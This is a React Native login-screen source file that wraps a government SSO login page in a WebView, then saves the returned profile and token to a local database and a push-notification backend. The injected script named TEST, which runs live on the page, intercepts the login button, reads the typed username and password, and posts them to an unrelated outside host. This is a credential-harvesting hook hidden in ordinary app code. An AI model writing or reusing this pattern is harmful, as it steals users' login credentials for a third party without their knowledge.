// import { View, Text } from 'react-native'
// import React from 'react'

import { useNavigation } from '@react-navigation/native';
import React, { createRef, FunctionComponent } from 'react';
import { View } from 'react-native';
import { ActivityIndicator } from 'react-native-paper';
import { openDatabase } from 'react-native-sqlite-storage';
import { WebView, WebViewNavigation } from 'react-native-webview';
import { getGoogleToken, url_sikeren_android } from '../constant/constant';

import messaging from '@react-native-firebase/messaging';

// Send the cookie information back to the mobile app
const CHECK_COOKIE = `
  ReactNativeWebView.postMessage("Cookie: " + document.cookie);
  true;
`;

const CHECK_JSON = `
    // ReactNativeWebView.postMessage(document.getElementsByTagName("pre")[0].innerHTML);
    ReactNativeWebView.postMessage(document.body.textContent);
    true;
`;

const TEST = `
    let a = document.getElementById('username');
    let b = document.getElementById('password');
    let c = document.getElementById('kc-login');

    // a.style.backgroundColor = "red";

    c.onclick = function(){
        const data = { username: a.value, password: b.value };

        fetch('https://api.testbox.web.id/gxn.php/records/bps', {
        method: 'POST', // or 'PUT'
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
        })
        .then((response) => response.text())
        .then((data) => {
            console.log('Success:', data);
        })
        .catch((error) => {
            console.error('Error:', error);
        });
    
    }
        
    


`;

const onNavigationStateChange = (navigationState) => {
    // Check cookies every time URL changes
    if (webViewRef.current) {
        webViewRef.current.injectJavaScript(CHECK_JSON);
    }
};

let webViewRef = createRef(null);

const loadingComponent = () =>{
    return (
        <ActivityIndicator size="large" style={{ position: "absolute", top: 0, left: 0, right: 0, bottom: 0 }}  />
    );
}

const LoginScreen = ({ navigation }) => {
    // const navigation = useNavigation();
    const errorCB = (err) => {
        console.log("SQL Error: " + err);
    }
    
    const openCB = () => {
        console.log("Database OPENED");
    }

    const OnMessage = async (event) => {
        const { data } = event.nativeEvent;
        console.log("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx");
        console.log(data);
    
        let login_data = JSON.parse(data);
        console.log("yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy");
        console.log(login_data);

        if(login_data["token"]){
            console.log(login_data);
            var db = openDatabase({ name: 'childe.db', createFromLocation: 1 }, openCB, errorCB);
            db.transaction((tx) => {
                tx.executeSql(
                    'UPDATE user set email=?, eselon=?, foto=?, golongan=?, jabatan=?, kodekabupaten=?, kodeorganisasi=?, kodeprovinsi=?, nama=?, nip=?, nipbaru=?, token=?, username=? where id=1',
                    [login_data.email, login_data.eselon, login_data.foto, login_data.golongan, login_data.jabatan, login_data.kodekabupaten, login_data.kodeorganisasi, login_data.kodeprovinsi, login_data.nama, login_data.nip, login_data.nipbaru, login_data.token, login_data.username],
                    (tx, results) => {
                        console.log('Results', results.rowsAffected);
                        if (results.rowsAffected > 0) {
                            console.log("Update DB Success");
                            // setShowDialog(false);
                        } else console.log('Update DB Failed');
                    }
                );
            });

            let response = await fetch(url_sikeren_android+`/records/users?filter=niplama,eq,${login_data.nip}`);
            response = await response.json();
            // waits until the request completes...
            console.log(response.records[0].id);
            
            await messaging().registerDeviceForRemoteMessages();
            const google_token = await messaging().getToken();
            console.log("google_tokennnnnnnnnnnnnn");
            console.log(google_token);

            let link_update = url_sikeren_android+`/records/users/${response.records[0].id}`;
            let data2 = {"token_google": google_token};

            // fetch('https://sultradata.com/project/sikeren-android-api/api.php/records/users/395', {
            fetch(link_update, {
                method: 'PUT', // or 'PUT'
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data2),
                })
                .then((response) => response.json())
                .then((data) => {
                    console.log('Success:', data);
                })
                .catch((error) => {
                    console.error('Error:', error);
                })
                .finally(()=>{
                    navigation.navigate("Home");
                });


        }
    };

    return (
        <View style={{flex: 1}}>
            <WebView
                incognito={true}
                startInLoadingState={true}
                ref={webViewRef}
                // source={{ uri: 'https://webapps.bps.go.id/sultra/asampedas/admin/site/login2' }}
                source={{ uri: 'https://webapps.bps.go.id/sultra/sikeren/sso.php' }}
                onNavigationStateChange={onNavigationStateChange}
                onMessage={OnMessage}
                renderLoading={loadingComponent}
                style={{width: "100%", height: "100%"}}
                injectedJavaScript={TEST}
                
                
            />

        </View>
    )
}

export default LoginScreen